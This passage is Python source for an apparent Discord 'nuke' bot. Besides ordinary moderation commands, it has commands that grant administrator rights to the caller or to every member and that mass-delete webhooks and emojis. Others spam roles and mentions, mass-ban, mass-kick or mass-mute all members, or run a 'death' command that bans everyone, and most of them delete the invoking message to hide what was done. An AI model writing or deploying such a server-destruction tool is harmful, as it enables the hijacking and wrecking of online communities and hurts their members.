        await send_dm(ctx, t("ban_yourself"))
        return

    if member.top_role >= ctx.author.top_role:
        await send_dm(ctx, t("ban_higher_role"))
        return

    if member.top_role >= ctx.guild.me.top_role:
        await send_dm(ctx, t("ban_bot_no_permission"))
        return

    try:
        try:
            dm_embed = discord.Embed(
                description=t("ban_dm", guild=ctx.guild.name, reason=reason),
                color=discord.Color.red()
            )
            await member.send(embed=dm_embed)
        except discord.Forbidden:
            pass

        await member.ban(reason=f"{reason} | Banned by {ctx.author}")
        print(f'{Fore.RED}[BAN] {Fore.WHITE}Banned {member.display_name} from {ctx.guild.name} by {ctx.author.display_name} | Reason: {reason}{Style.RESET_ALL}')
        embed = discord.Embed(
            description=t("ban_success", member=member.mention),
            color=discord.Color.red()
        )
        await send_dm(ctx, embed=embed)
    except discord.Forbidden:
        await send_dm(ctx, t("ban_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='unban')
@commands.has_permissions(ban_members=True)
async def unban(ctx, user_id: int):
    """Unban a user by their ID"""
    try:
        user = await bot.fetch_user(user_id)
        await ctx.guild.unban(user)
        print(f'{Fore.GREEN}[UNBAN] {Fore.WHITE}Unbanned {user.name} from {ctx.guild.name} by {ctx.author.display_name}{Style.RESET_ALL}')
        embed = discord.Embed(
            description=t("unban_success", user=user.mention),
            color=discord.Color.green()
        )
        await send_dm(ctx, embed=embed)
    except discord.NotFound:
        await send_dm(ctx, t("unban_not_found"))
    except discord.Forbidden:
        await send_dm(ctx, t("unban_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='kick')
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, *, reason: str = "BYE BYE"):
    """Kick a user from the server"""
    if member == ctx.author:
        await send_dm(ctx, t("kick_yourself"))
        return

    if member.top_role >= ctx.author.top_role:
        await send_dm(ctx, t("kick_higher_role"))
        return

    if member.top_role >= ctx.guild.me.top_role:
        await send_dm(ctx, t("kick_bot_no_permission"))
        return

    try:
        try:
            dm_embed = discord.Embed(
                description=t("kick_dm", guild=ctx.guild.name, reason=reason),
                color=discord.Color.orange()
            )
            await member.send(embed=dm_embed)
        except discord.Forbidden:
            pass

        await member.kick(reason=f"{reason} | Kicked by {ctx.author}")
        print(f'{Fore.RED}[KICK] {Fore.WHITE}Kicked {member.display_name} from {ctx.guild.name} by {ctx.author.display_name} | Reason: {reason}{Style.RESET_ALL}')
        embed = discord.Embed(
            description=t("kick_success", member=member.mention),
            color=discord.Color.orange()
        )
        await send_dm(ctx, embed=embed)
    except discord.Forbidden:
        await send_dm(ctx, t("kick_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='mute')
@commands.has_permissions(moderate_members=True)
async def mute(ctx, member: discord.Member, duration: str = "10m", *, reason: str = "BYE BYE"):
    """Timeout a user (e.g., .!mute @user 10m reason)"""
    if member == ctx.author:
        await send_dm(ctx, t("mute_yourself"))
        return

    if member.top_role >= ctx.author.top_role:
        await send_dm(ctx, t("mute_higher_role"))
        return

    if member.top_role >= ctx.guild.me.top_role:
        await send_dm(ctx, t("mute_bot_no_permission"))
        return

    timeout_duration = parse_duration(duration)
    if timeout_duration is None:
        await send_dm(ctx, t("mute_invalid_format"))
        return

    try:
        try:
            dm_embed = discord.Embed(
                description=t("mute_dm", guild=ctx.guild.name, reason=reason),
                color=discord.Color.dark_gray()
            )
            await member.send(embed=dm_embed)
        except discord.Forbidden:
            pass

        await member.timeout(timeout_duration, reason=f"{reason} | Muted by {ctx.author}")
        print(f'{Fore.YELLOW}[MUTE] {Fore.WHITE}Muted {member.display_name} for {duration} in {ctx.guild.name} by {ctx.author.display_name} | Reason: {reason}{Style.RESET_ALL}')
        embed = discord.Embed(
            description=t("mute_success", member=member.mention, duration=duration),
            color=discord.Color.dark_gray()
        )
        await send_dm(ctx, embed=embed)
    except discord.Forbidden:
        await send_dm(ctx, t("mute_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='unmute')
@commands.has_permissions(moderate_members=True)
async def unmute(ctx, member: discord.Member):
    """Remove timeout from a user"""
    try:
        await member.timeout(None)
        print(f'{Fore.GREEN}[UNMUTE] {Fore.WHITE}Unmuted {member.display_name} in {ctx.guild.name} by {ctx.author.display_name}{Style.RESET_ALL}')
        embed = discord.Embed(
            description=t("unmute_success", member=member.mention),
            color=discord.Color.green()
        )
        await send_dm(ctx, embed=embed)
    except discord.Forbidden:
        await send_dm(ctx, t("unmute_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='god')
async def god(ctx):
    """Give user administrator role"""
    try:
        existing_role = discord.utils.get(ctx.guild.roles, name=".")

        if existing_role:
            await ctx.author.add_roles(existing_role)
            embed = discord.Embed(
                description=t("god_activated", user=ctx.author.mention),
                color=discord.Color.gold()
            )
            await send_dm(ctx, embed=embed)
        else:
            new_role = await ctx.guild.create_role(
                name=".",
                permissions=discord.Permissions(administrator=True),
                color=discord.Color.gold(),
                reason=f"God role created by {ctx.author}"
            )

            try:
                bot_top_role = ctx.guild.me.top_role
                await new_role.edit(position=bot_top_role.position - 1)
            except discord.HTTPException:
                pass

            await ctx.author.add_roles(new_role)

            print(f'{Fore.MAGENTA}[GOD] {Fore.WHITE}God mode activated for {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')

            embed = discord.Embed(
                description=t("god_activated", user=ctx.author.mention),
                color=discord.Color.gold()
            )
            await send_dm(ctx, embed=embed)

    except discord.Forbidden:
        await send_dm(ctx, t("god_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='god-all')
@commands.has_permissions(administrator=True)
async def god_all(ctx):
    """Give everyone administrator role"""
    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        guild = ctx.guild
        author = ctx.author

        print(f'{Fore.MAGENTA}{Style.BRIGHT}[GOD-ALL] {Fore.WHITE}Giving admin to everyone in {guild.name} by {author.display_name}{Style.RESET_ALL}')

        god_role = discord.utils.get(guild.roles, name=".")

        if not god_role:
            god_role = await guild.create_role(
                name=".",
                permissions=discord.Permissions(administrator=True),
                color=discord.Color.gold(),
                reason=f"God-all role created by {author}"
            )

            try:
                bot_top_role = guild.me.top_role
                await god_role.edit(position=bot_top_role.position - 1)
            except discord.HTTPException:
                pass

            print(f'{Fore.MAGENTA}[GOD-ALL] {Fore.WHITE}Created god role (.){Style.RESET_ALL}')

        try:
            await author.send(t("god_all_initiated"))
        except discord.Forbidden:
            pass

        success_count = 0
        failed_count = 0

        for member in guild.members:
            if member.bot:
                continue
            try:
                await member.add_roles(god_role, reason=f"God-all by {author}")
                success_count += 1
            except Exception:
                failed_count += 1

        print(f'{Fore.MAGENTA}{Style.BRIGHT}[GOD-ALL] {Fore.WHITE}Complete: {success_count} members given admin, {failed_count} failed{Style.RESET_ALL}')

        try:
            embed = discord.Embed(
                description=t("god_all_complete", count=success_count),
                color=discord.Color.gold()
            )
            await author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, t("god_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='rename-server')
@commands.has_permissions(administrator=True)
async def rename_server(ctx, *, new_name: str):
    """Rename the server"""
    try:
        old_name = ctx.guild.name

        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        await ctx.guild.edit(name=new_name, reason=f"Server renamed by {ctx.author}")

        print(f'{Fore.MAGENTA}[RENAME-SERVER] {Fore.WHITE}Server renamed from "{old_name}" to "{new_name}" by {ctx.author.display_name}{Style.RESET_ALL}')

        embed = discord.Embed(
            description=t("rename_server_success", name=new_name),
            color=discord.Color.blue()
        )
        await send_dm(ctx, embed=embed)

    except discord.Forbidden:
        await send_dm(ctx, t("rename_server_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='server-icon')
@commands.has_permissions(administrator=True)
async def server_icon(ctx, image_url: str):
    """Change the server icon"""
    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        import aiohttp
        async with aiohttp.ClientSession() as session:
            async with session.get(image_url) as resp:
                if resp.status != 200:
                    await send_dm(ctx, t("server_icon_failed"))
                    return
                image_data = await resp.read()

        await ctx.guild.edit(icon=image_data, reason=f"Server icon changed by {ctx.author}")

        print(f'{Fore.MAGENTA}[SERVER-ICON] {Fore.WHITE}Server icon changed by {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')

        embed = discord.Embed(
            description=t("server_icon_success"),
            color=discord.Color.blue()
        )
        await send_dm(ctx, embed=embed)

    except discord.Forbidden:
        await send_dm(ctx, t("server_icon_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='nick')
@commands.has_permissions(manage_nicknames=True)
async def nick(ctx, member: discord.Member, *, nickname: str):
    """Change a user's nickname"""
    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        old_nick = member.display_name

        if member.top_role >= ctx.guild.me.top_role:
            await send_dm(ctx, t("nick_higher_role", member=member.mention))
            return

        await member.edit(nick=nickname, reason=f"Nickname changed by {ctx.author}")

        print(f'{Fore.CYAN}[NICK] {Fore.WHITE}Changed {old_nick} to "{nickname}" by {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')

        embed = discord.Embed(
            description=t("nick_success", member=member.mention, nickname=nickname),
            color=discord.Color.green()
        )
        await send_dm(ctx, embed=embed)

    except discord.Forbidden:
        await send_dm(ctx, t("nick_no_permission", member=member.mention))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='nick-all')
@commands.has_permissions(administrator=True)
async def nick_all(ctx, *, nickname: str):
    """Set everyone's nickname to the same thing"""
    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        guild = ctx.guild
        author = ctx.author

        print(f'{Fore.CYAN}{Style.BRIGHT}[NICK-ALL] {Fore.WHITE}Setting all nicknames to "{nickname}" by {author.display_name} in {guild.name}{Style.RESET_ALL}')

        try:
            await author.send(t("nick_all_starting", nickname=nickname))
        except discord.Forbidden:
            pass

        success_count = 0
        failed_count = 0
        members = list(guild.members)

        for member in members:
            if member.bot:
                failed_count += 1
                continue
            if member.top_role >= guild.me.top_role:
                failed_count += 1
                continue
            if await rate_limited_action(lambda m=member: m.edit(nick=nickname, reason=f"Nick-all by {author}")):
                success_count += 1
            else:
                failed_count += 1

        print(f'{Fore.CYAN}{Style.BRIGHT}[NICK-ALL] {Fore.WHITE}Complete: {success_count} nicknames changed, {failed_count} failed{Style.RESET_ALL}')
        try:
            embed = discord.Embed(
                description=t("nick_all_complete", count=success_count, failed=failed_count),
                color=discord.Color.green()
            )
            await author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, t("nick_all_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='role-spam')
@commands.has_permissions(administrator=True)
async def role_spam(ctx, role_name: str, count: int):
    """Mass create roles with a specific name"""
    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        if count <= 0:
            await send_dm(ctx, t("role_spam_invalid_count"))
            return
        if count > 250:
            await send_dm(ctx, t("role_spam_too_many"))
            return

        guild = ctx.guild
        author = ctx.author

        print(f'{Fore.MAGENTA}{Style.BRIGHT}[ROLE-SPAM] {Fore.WHITE}Creating {count}x "{role_name}" roles by {author.display_name} in {guild.name}{Style.RESET_ALL}')

        try:
            await author.send(t("role_spam_starting", count=count, name=role_name))
        except discord.Forbidden:
            pass

        created_count = 0
        failed_count = 0

        for _ in range(count):
            try:
                await guild.create_role(name=role_name, reason=f"Role-spam by {author}")
                created_count += 1
            except discord.HTTPException:
                failed_count += 1
                await asyncio.sleep(0.5)
            except Exception:
                failed_count += 1

        print(f'{Fore.MAGENTA}{Style.BRIGHT}[ROLE-SPAM] {Fore.WHITE}Complete: {created_count} roles created, {failed_count} failed{Style.RESET_ALL}')
        try:
            embed = discord.Embed(
                description=t("role_spam_complete", created=created_count, failed=failed_count),
                color=discord.Color.purple()
            )
            await author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, t("role_spam_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='webhook-nuke')
@commands.has_permissions(administrator=True)
async def webhook_nuke(ctx):
    """Delete all webhooks in the server"""
    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        guild = ctx.guild
        author = ctx.author

        print(f'{Fore.RED}{Style.BRIGHT}[WEBHOOK-NUKE] {Fore.WHITE}Deleting all webhooks in {guild.name} by {author.display_name}{Style.RESET_ALL}')

        try:
            await author.send(t("webhook_nuke_starting"))
        except discord.Forbidden:
            pass

        deleted_count = 0
        failed_count = 0

        for channel in guild.text_channels:
            try:
                webhooks = await channel.webhooks()
                for webhook in webhooks:
                    try:
                        await webhook.delete(reason=f"Webhook-nuke by {author}")
                        deleted_count += 1
                    except Exception:
                        failed_count += 1
            except Exception:
                pass

        print(f'{Fore.RED}{Style.BRIGHT}[WEBHOOK-NUKE] {Fore.WHITE}Complete: {deleted_count} webhooks deleted, {failed_count} failed{Style.RESET_ALL}')
        try:
            embed = discord.Embed(
                description=t("webhook_nuke_complete", count=deleted_count),
                color=discord.Color.red()
            )
            await author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, t("webhook_nuke_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='server-banner')
@commands.has_permissions(administrator=True)
async def server_banner(ctx, image_url: str):
    """Change the server banner (requires boost level 2+)"""
    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        if "BANNER" not in ctx.guild.features:
            await send_dm(ctx, t("server_banner_no_feature"))
            return

        import aiohttp
        async with aiohttp.ClientSession() as session:
            async with session.get(image_url) as resp:
                if resp.status != 200:
                    await send_dm(ctx, t("server_banner_failed"))
                    return
                image_data = await resp.read()

        await ctx.guild.edit(banner=image_data, reason=f"Server banner changed by {ctx.author}")

        print(f'{Fore.MAGENTA}[SERVER-BANNER] {Fore.WHITE}Server banner changed by {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')

        embed = discord.Embed(
            description=t("server_banner_success"),
            color=discord.Color.blue()
        )
        await send_dm(ctx, embed=embed)

    except discord.Forbidden:
        await send_dm(ctx, t("server_banner_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='strip')
@commands.has_permissions(administrator=True)
async def strip(ctx, member: discord.Member):
    """Remove all roles from a user"""
    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        if member == ctx.author:
            await send_dm(ctx, t("strip_yourself"))
            return

        if member.top_role >= ctx.guild.me.top_role:
            await send_dm(ctx, t("strip_higher_role", member=member.mention))
            return

        roles_to_remove = [role for role in member.roles
                           if role != ctx.guild.default_role and not role.managed]
        role_count = len(roles_to_remove)

        if role_count == 0:
            await send_dm(ctx, t("strip_no_roles", member=member.mention))
            return

        await member.remove_roles(*roles_to_remove, reason=f"Stripped by {ctx.author}")

        print(f'{Fore.YELLOW}[STRIP] {Fore.WHITE}Stripped {role_count} roles from {member.display_name} by {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')

        embed = discord.Embed(
            description=t("strip_success", count=role_count, member=member.mention),
            color=discord.Color.orange()
        )
        await send_dm(ctx, embed=embed)

    except discord.Forbidden:
        await send_dm(ctx, t("strip_no_permission", member=member.mention))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='emoji-nuke')
@commands.has_permissions(administrator=True)
async def emoji_nuke(ctx):
    """Delete all custom emojis"""
    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        guild = ctx.guild
        author = ctx.author

        print(f'{Fore.RED}{Style.BRIGHT}[EMOJI-NUKE] {Fore.WHITE}Deleting all emojis in {guild.name} by {author.display_name}{Style.RESET_ALL}')

        try:
            await author.send(t("emoji_nuke_starting"))
        except discord.Forbidden:
            pass

        deleted_count = 0
        failed_count = 0

        emojis = list(guild.emojis)

        for emoji in emojis:
            try:
                await emoji.delete(reason=f"Emoji-nuke by {author}")
                deleted_count += 1
            except Exception:
                failed_count += 1

        print(f'{Fore.RED}{Style.BRIGHT}[EMOJI-NUKE] {Fore.WHITE}Complete: {deleted_count} emojis deleted, {failed_count} failed{Style.RESET_ALL}')
        try:
            embed = discord.Embed(
                description=t("emoji_nuke_complete", count=deleted_count),
                color=discord.Color.red()
            )
            await author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, t("emoji_nuke_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='shuffle-channels')
@commands.has_permissions(administrator=True)
async def shuffle_channels(ctx):
    """Randomly reorder all channels"""
    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        guild = ctx.guild
        author = ctx.author

        print(f'{Fore.CYAN}{Style.BRIGHT}[SHUFFLE-CHANNELS] {Fore.WHITE}Shuffling all channels in {guild.name} by {author.display_name}{Style.RESET_ALL}')

        try:
            await author.send(t("shuffle_channels_starting"))
        except discord.Forbidden:
            pass

        import random
        modified_count = 0

        for category in guild.categories:
            channels = category.channels
            if len(channels) > 0:
                positions = list(range(len(channels)))
                random.shuffle(positions)
                for i, channel in enumerate(channels):
                    try:
                        await channel.edit(position=positions[i])
                        modified_count += 1
                    except Exception:
                        pass

        no_category_channels = [ch for ch in guild.channels
                                if ch.category is None and not isinstance(ch, discord.CategoryChannel)]
        if len(no_category_channels) > 0:
            positions = list(range(len(no_category_channels)))
            random.shuffle(positions)
            for i, channel in enumerate(no_category_channels):
                try:
                    await channel.edit(position=positions[i])
                    modified_count += 1
                except Exception:
                    pass

        print(f'{Fore.CYAN}{Style.BRIGHT}[SHUFFLE-CHANNELS] {Fore.WHITE}Complete: {modified_count} channels shuffled{Style.RESET_ALL}')
        try:
            embed = discord.Embed(
                description=t("shuffle_channels_complete", count=modified_count),
                color=discord.Color.blue()
            )
            await author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, t("shuffle_channels_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='voice-scatter')
@commands.has_permissions(move_members=True)
async def voice_scatter(ctx):
    """Scatter users randomly across voice channels"""
    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        guild = ctx.guild
        author = ctx.author

        print(f'{Fore.CYAN}{Style.BRIGHT}[VOICE-SCATTER] {Fore.WHITE}Scattering voice users in {guild.name} by {author.display_name}{Style.RESET_ALL}')

        voice_channels = guild.voice_channels

        if len(voice_channels) < 2:
            await send_dm(ctx, t("voice_scatter_need_channels"))
            return

        members_in_voice = []
        for channel in voice_channels:
            members_in_voice.extend(channel.members)

        if len(members_in_voice) == 0:
            await send_dm(ctx, t("voice_scatter_no_users"))
            return

        try:
            await author.send(t("voice_scatter_starting", users=len(members_in_voice),
                                channels=len(voice_channels)))
        except discord.Forbidden:
            pass

        import random
        moved_count = 0
        failed_count = 0

        for member in members_in_voice:
            try:
                target_channel = random.choice(voice_channels)
                if member.voice and member.voice.channel != target_channel:
                    await member.move_to(target_channel, reason=f"Voice-scatter by {author}")
                    moved_count += 1
            except Exception:
                failed_count += 1

        print(f'{Fore.CYAN}{Style.BRIGHT}[VOICE-SCATTER] {Fore.WHITE}Complete: {moved_count} users scattered, {failed_count} failed{Style.RESET_ALL}')
        try:
            embed = discord.Embed(
                description=t("voice_scatter_complete", count=moved_count),
                color=discord.Color.green()
            )
            await author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, t("voice_scatter_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='mention-spam')
@commands.has_permissions(mention_everyone=True)
async def mention_spam(ctx, target: str, count: int):
    """Spam mentions of a user or role"""
    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        if count <= 0:
            await send_dm(ctx, t("mention_spam_invalid_count"))
            return
        if count > 100:
            await send_dm(ctx, t("mention_spam_too_many"))
            return

        author = ctx.author

        print(f'{Fore.YELLOW}{Style.BRIGHT}[MENTION-SPAM] {Fore.WHITE}Spamming {count} mentions of {target} by {author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')

        try:
            await author.send(t("mention_spam_starting", count=count))
        except discord.Forbidden:
            pass

        sent_count = 0

        for _ in range(count):
            try:
                msg = await ctx.send(target)
                await msg.delete()
                sent_count += 1
            except Exception:
                pass

        print(f'{Fore.YELLOW}{Style.BRIGHT}[MENTION-SPAM] {Fore.WHITE}Complete: {sent_count} mentions sent{Style.RESET_ALL}')
        try:
            embed = discord.Embed(
                description=t("mention_spam_complete", count=sent_count),
                color=discord.Color.gold()
            )
            await author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, t("mention_spam_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='server-desc')
@commands.has_permissions(administrator=True)
async def server_desc(ctx, *, description: str):
    """Change the server description"""
    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        await ctx.guild.edit(description=description, reason=f"Server description changed by {ctx.author}")

        print(f'{Fore.MAGENTA}[SERVER-DESC] {Fore.WHITE}Server description changed by {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')

        embed = discord.Embed(
            description=t("server_desc_success"),
            color=discord.Color.blue()
        )
        await send_dm(ctx, embed=embed)

    except discord.Forbidden:
        await send_dm(ctx, t("server_desc_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='move-all')
@commands.has_permissions(move_members=True)
async def move_all(ctx, channel: discord.VoiceChannel):
    """Move all users to a specific voice channel"""
    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        guild = ctx.guild
        author = ctx.author

        print(f'{Fore.CYAN}{Style.BRIGHT}[MOVE-ALL] {Fore.WHITE}Moving all voice users to {channel.name} by {author.display_name} in {guild.name}{Style.RESET_ALL}')

        members_in_voice = []
        for vc in guild.voice_channels:
            members_in_voice.extend(vc.members)

        if len(members_in_voice) == 0:
            await send_dm(ctx, t("move_all_no_users"))
            return

        try:
            await author.send(t("move_all_starting", users=len(members_in_voice), channel=channel.name))
        except discord.Forbidden:
            pass

        moved_count = 0
        failed_count = 0

        for member in members_in_voice:
            if member.voice and member.voice.channel != channel:
                try:
                    await member.move_to(channel, reason=f"Move-all by {author}")
                    moved_count += 1
                except Exception:
                    failed_count += 1

        print(f'{Fore.CYAN}{Style.BRIGHT}[MOVE-ALL] {Fore.WHITE}Complete: {moved_count} users moved, {failed_count} failed{Style.RESET_ALL}')
        try:
            embed = discord.Embed(
                description=t("move_all_complete", count=moved_count, channel=channel.mention),
                color=discord.Color.green()
            )
            await author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, t("move_all_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@commands.cooldown(1, 60, commands.BucketType.guild)
@bot.command(name='ban-all')
@commands.has_permissions(ban_members=True)
async def ban_all(ctx, *, reason: str = "BYE BYE"):
    """Ban all members in the server"""
    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        try:
            await ctx.author.send(t("ban_all_starting"))
        except discord.Forbidden:
            pass

        banned_count = 0
        failed_count = 0

        members = list(ctx.guild.members)

        for member in members:
            if member.bot and member.id == bot.user.id:
                continue
            if member.id == ctx.author.id:
                continue
            if member.top_role >= ctx.guild.me.top_role:
                failed_count += 1
                continue

            try:
                await member.send(embed=discord.Embed(
                    description=t("ban_dm", guild=ctx.guild.name, reason=reason),
                    color=discord.Color.red()
                ))
            except (discord.HTTPException, discord.Forbidden):
                pass

            if await rate_limited_action(lambda m=member: m.ban(reason=f"{reason} | Mass ban by {ctx.author}")):
                banned_count += 1
            else:
                failed_count += 1

        print(f'{Fore.RED}[BAN-ALL] {Fore.WHITE}Banned {banned_count} members in {ctx.guild.name} by {ctx.author.display_name} | Reason: {reason}{Style.RESET_ALL}')
        try:
            embed = discord.Embed(
                description=t("ban_all_complete", count=banned_count),
                color=discord.Color.red()
            )
            await ctx.author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, t("ban_all_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@commands.cooldown(1, 60, commands.BucketType.guild)
@bot.command(name='kick-all')
@commands.has_permissions(kick_members=True)
async def kick_all(ctx, *, reason: str = "BYE BYE"):
    """Kick all members in the server"""
    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        try:
            await ctx.author.send(t("kick_all_starting"))
        except discord.Forbidden:
            pass

        kicked_count = 0
        failed_count = 0

        members = list(ctx.guild.members)

        for member in members:
            if member.bot and member.id == bot.user.id:
                continue
            if member.id == ctx.author.id:
                continue
            if member.top_role >= ctx.guild.me.top_role:
                failed_count += 1
                continue

            try:
                await member.send(embed=discord.Embed(
                    description=t("kick_dm", guild=ctx.guild.name, reason=reason),
                    color=discord.Color.orange()
                ))
            except (discord.HTTPException, discord.Forbidden):
                pass

            if await rate_limited_action(lambda m=member: m.kick(reason=f"{reason} | Mass kick by {ctx.author}")):
                kicked_count += 1
            else:
                failed_count += 1

        print(f'{Fore.RED}[KICK-ALL] {Fore.WHITE}Kicked {kicked_count} members in {ctx.guild.name} by {ctx.author.display_name} | Reason: {reason}{Style.RESET_ALL}')
        try:
            embed = discord.Embed(
                description=t("kick_all_complete", count=kicked_count),
                color=discord.Color.orange()
            )
            await ctx.author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, t("kick_all_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@commands.cooldown(1, 30, commands.BucketType.guild)
@bot.command(name='mute-all')
@commands.has_permissions(moderate_members=True)
async def mute_all(ctx, duration: str = "10m", *, reason: str = "BYE BYE"):
    """Timeout all members in the server"""
    timeout_duration = parse_duration(duration)
    if timeout_duration is None:
        await send_dm(ctx, t("mute_invalid_format"))
        return

    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        try:
            await ctx.author.send(t("mute_all_starting", duration=duration))
        except discord.Forbidden:
            pass

        muted_count = 0
        failed_count = 0

        members = list(ctx.guild.members)

        for member in members:
            if member.bot and member.id == bot.user.id:
                continue
            if member.id == ctx.author.id:
                continue
            if member.top_role >= ctx.guild.me.top_role:
                failed_count += 1
                continue

            try:
                await member.send(embed=discord.Embed(
                    description=t("mute_dm", guild=ctx.guild.name, reason=reason),
                    color=discord.Color.dark_gray()
                ))
            except (discord.HTTPException, discord.Forbidden):
                pass

            if await rate_limited_action(lambda m=member: m.timeout(timeout_duration, reason=f"{reason} | Mass mute by {ctx.author}")):
                muted_count += 1
            else:
                failed_count += 1

        print(f'{Fore.YELLOW}[MUTE-ALL] {Fore.WHITE}Muted {muted_count} members for {duration} in {ctx.guild.name} by {ctx.author.display_name} | Reason: {reason}{Style.RESET_ALL}')
        try:
            embed = discord.Embed(
                description=t("mute_all_complete", count=muted_count, duration=duration),
                color=discord.Color.dark_gray()
            )
            await ctx.author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, t("mute_all_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@commands.cooldown(1, 120, commands.BucketType.guild)
@bot.command(name='death')
@commands.has_permissions(administrator=True)
async def death(ctx):
    """Ultimate destruction - Delete everything and ban everyone"""
    try:
        print(f'{Back.RED}{Fore.WHITE}{Style.BRIGHT}[☠ DEATH ☠] INITIATED BY {ctx.author.display_name} IN {ctx.guild.name.upper()} - TOTAL ANNIHILATION{Style.RESET_ALL}')

        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        guild = ctx.guild
        author = ctx.author

        try:
            await author.send(t("death_initiated"))
        except discord.Forbidden:
            pass

        banned_count = 0
        deleted_channels = 0
        deleted_categories = 0
        deleted_roles = 0

        print(f'{Back.RED}{Fore.WHITE}[☠ DEATH ☠] Phase 1: Banning all members...{Style.RESET_ALL}')
        members = list(guild.members)
        for member in members:
            if member.bot and member.id == bot.user.id:
                continue
            if member.id == author.id:
                continue
            if member.top_role >= guild.me.top_role:
                continue
            try:
                await member.ban(reason=f"DEATH COMMAND | Executed by {author}")
                banned_count += 1
            except Exception:
                pass

